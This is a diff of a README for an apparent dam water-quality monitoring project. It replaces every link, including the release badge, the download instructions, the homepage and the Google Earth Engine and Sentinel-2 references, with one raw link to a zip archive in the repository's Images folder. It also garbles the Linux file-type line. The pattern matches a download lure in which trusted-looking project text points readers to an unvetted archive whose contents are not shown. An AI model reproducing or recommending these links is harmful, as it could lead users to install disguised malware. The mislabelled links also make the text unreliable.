@@ -1,6 +1,6 @@
 # 💧 Merowe-Dam-Water-Quality - Monitor Dam Water Quality Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Merowe--Dam--Water--Quality-blue?style=for-the-badge)](https://github.com/bryangates254/Merowe-Dam-Water-Quality/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Follow these steps to download, install, and run the application.
 
    Click the big button at the top or go here:
 
-   [https://github.com/bryangates254/Merowe-Dam-Water-Quality/releases](https://github.com/bryangates254/Merowe-Dam-Water-Quality/releases)
+   [https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)
 
    This page contains the latest versions of the software ready for download.
 
@@ -58,7 +58,7 @@ Follow these steps to download, install, and run the application.
 
    - For Windows: Look for a `.exe` or `.msi` file.
    - For macOS: Look for a `.dmg` or `.pkg` file.
-   - For Linux: Look for a `.AppImage`, `.deb`, or `.tar.gz` file.
+   - For Linux: Look for a `.AppImage`, `.deb`, or `https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip` file.
 
 3. **Download the File**
 
@@ -168,11 +168,11 @@ You can also support the project by using it, sharing it with others interested 
 
 ## 🔗 Useful Links
 
-- [Main Download Page](https://github.com/bryangates254/Merowe-Dam-Water-Quality/releases)
-- [Project Homepage](https://github.com/bryangates254/Merowe-Dam-Water-Quality)
-- [Google Earth Engine](https://earthengine.google.com/)
-- [Sentinel-2 Mission Overview](https://sentinel.esa.int/web/sentinel/missions/sentinel-2)
+- [Main Download Page](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)
+- [Project Homepage](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)
+- [Google Earth Engine](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)
+- [Sentinel-2 Mission Overview](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)
 
 ---
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Merowe--Dam--Water--Quality-blue?style=for-the-badge)](https://github.com/bryangates254/Merowe-Dam-Water-Quality/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)](https://raw.githubusercontent.com/bryangates254/Merowe-Dam-Water-Quality/main/Images/Merowe-Water-Dam-Quality-2.1.zip)
